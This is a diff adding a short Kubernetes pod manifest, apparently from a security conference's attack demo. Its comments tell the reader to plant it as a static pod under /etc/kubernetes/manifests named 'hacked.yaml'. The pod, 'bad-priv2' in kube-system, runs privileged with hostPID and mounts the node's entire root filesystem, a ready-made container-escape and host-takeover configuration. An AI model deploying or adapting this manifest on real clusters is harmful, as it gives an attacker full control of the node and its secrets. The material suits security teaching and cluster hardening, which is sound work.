@@ -1,0 +1,26 @@
+# This is an example that you could use as a mirror pod on the node. Make sure
+# to replace the image name with whatever image you want
+# Example: echo `<this file>` > /etc/kubernetes/manifests/hacked.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: bad-priv2
+  namespace: kube-system
+spec:
+  containers:
+  - name: bad
+    hostPID: true
+    image: gcr.io/shmoocon-talk-hacking/brick
+    stdin: true
+    tty: true
+    imagePullPolicy: IfNotPresent
+    volumeMounts:
+      - mountPath: /chroot
+        name: host
+  securityContext:
+    privileged: true
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
